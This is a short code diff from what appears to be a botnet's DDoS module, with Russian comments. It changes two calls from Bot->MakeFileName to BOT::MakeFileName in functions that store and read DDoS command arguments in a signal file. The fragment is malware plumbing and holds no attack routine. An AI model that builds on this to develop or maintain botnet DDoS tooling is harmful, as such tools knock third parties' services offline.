@@ -15,7 +15,7 @@ DWORD WINAPI DDOSProces(LPVOID)
 
 	BOT::Initialize();
 
-	string FileName = Bot->MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());
+	string FileName = BOT::MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());
 	DWORD Sz = 0;
 	PCHAR Args = (PCHAR)File::ReadToBufferA(FileName.t_str(), Sz);
 
@@ -112,7 +112,7 @@ bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 	// ------ Запускаем процесс --------
 
 	// Сохраняем аргументы команды
-	string FileName = Bot->MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());
+	string FileName = BOT::MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());
 
 	DWORD Len = STRA::Length(Args) + 1;
 	if (File::WriteBufferA(FileName.t_str(), Args, Len) != Len)
